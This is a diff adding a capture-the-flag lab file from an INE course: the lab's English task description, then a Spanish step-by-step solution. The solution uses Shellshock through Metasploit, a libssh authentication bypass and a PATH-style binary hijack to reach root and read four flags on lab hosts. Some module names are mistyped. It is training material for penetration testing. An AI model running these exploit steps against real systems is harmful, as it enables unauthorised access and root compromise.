@@ -1,0 +1,230 @@
+Completing Skill Check Labs
+
+Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
+
+Lab Environment
+
+In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at http://target1.ine.local and http://target2.ine.local.
+
+Objective: Perform system/host-based attacks on the target and capture all the flags hidden within the environment.
+
+Flags to Capture:
+
+Flag 1: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
+Flag 2: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
+Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
+Flag 4: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.
+Tools
+
+The best tools for this lab are:
+
+Nmap
+Burp Suite
+Metasploit Framework
+
+
+                                  #EMPECEMOS CON FLAG 1
+        nmap -sC -sV target1.ine.local
+Esto nos dira que puertos estan abiertos - que scrips podemos usar - que tipo de server esta utilizando en nuestro objetivo.
+        msfconsole -q
+Creamos un metasploit framework 
+Nos vamos a FIREFOX y buscamos target1.ine.local
+Nos damos cuenta que tiene /browser.cgi
+        search _cgi_ 
+        use exploit/multi/http/apache_mod_cgi_bash_env_exec
+        set RHOSTS target1.ine.local
+        set LHOST nuestroip
+        set TARGETURI /browser.cgi
+Aqui nos creara una sesion meterpreter con la cual podemos acceder a este ip address.
+        shell
+        /bin/bash -i
+        cd /
+        ld
+        ls
+        cat flag.txt
+        FLAG ENCONTRADA
+Ya una vez dentro podemos crear la sesion con shell - de ahi nos vamos a bin/bash -i - de ahi nos ponemos hasta el usuario - le ponemos ld - 
+y despues ls para ver todos los shares que tenemos - hacemos cat a la que dice flag.txt - FLAG ENCONTRADA -
+
+                                #EMPECEMOS CON FLAG 2
+En la misma sesion de meterpreter este seria nuestro comando:
+daemon@target1:
+        /opt/apache/htdocs
+        ls
+Aqui no encontraremos nada, PERO como viene "HIDDEN" buscamos con el comando ls -la
+        ls -la
+        cat .flag.txt
+        FLAG 2 ENCONTRADA
+                                #Empecemos con FLAG 3
+Ahora nos esta pidiendo saber las caracteristicas de "target2.ine.local"
+        nmap -sV -sC target2.ine.local
+Esto nos dira el port - service - version - nos dira un poco de script del mismo
+Abriremos un metasploit framework
+        msfconsole -q
+        search libssh 0.8.3
+Esta version la podemos encontrar en el nmap scan con -sC que hicimos de nuestro objetivo
+        use auxiliary/scanner/ssh/lybssh_auth_bypass
+        set RHOSTS target2.ine.local
+        set SPAWN_PY true
+        exploit
+Nos creara una session y nos meteremos a esa session.
+        sessions -i 1
+Ya dentro de esta sesion como en las indicacions nos dicen que busquemops a traves de home eso haremos.
+Nos aparecera un user como:
+sh 5-g.s$
+        ls
+        cd home
+        ls
+        cd user
+        ls
+        cat flag.txt
+        FLAG 3 ENCONTRADA
+Aqui buscaremos los shares, veremos que esta home, y nos adentramos - buscamos shares y esta user - buscamos shares y esta flag.txt - 
+leemos el archivo flag.txt con cat - FLAG 3 ENCONTRADA -
+                            #EMPECEMOS CON FLAG 4
+Al igual que la pasada crearemos un metasploit framework 
+        msfconsole -q
+        use auxiliary/scanner/ssh/libssh_auth_bypass
+        set RHOSTS target2.ine.local
+        set SPAWN_PY true
+        exploit
+Pondremos nuestro RHOSTS A nuestro objetivo - haremos que spawn_py sea true - explotamos -
+Nos meteremos a la session que acabamos de crear
+        sessions -i
+        sessions 1
+Aqui no importa el numero, que sea el numero que diga en id
+Ya entraremos a sh-5b.$
+        /bin/bash -i
+        pwd
+        ls
+ya tendremos que estar en el usuario: user@target2 algo asi
+        ls -la
+        file welcome
+        strings welcome
+Aqi podemos observar que en nuestros string se encuentra greetings  y lo que haremos es removerlo con rm
+        rm greetings
+        ls -la 
+        cp /bin/bash greetings
+        ls -la
+        ./welcome
+Una vez removiendo greetings lo volvemos a copiar en donde mismo.
+Buscamos los archivos escondidos con ls -la.
+Despues pondremos ./welcome
+Aqui ya veremos que tenemos acceso a root 
+Verificamos con whoami
+        cd /
+        cd root
+        ls
+        cat flag.txt
+        FLAG 4 ENCONTRADA
+Nos vamos al directorio cd /
+Nos vamos al directorio root /
+Nos vamos a los shares
+Cat el archivo flag.txt
+FLAG 4 ENCONTRADA.
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
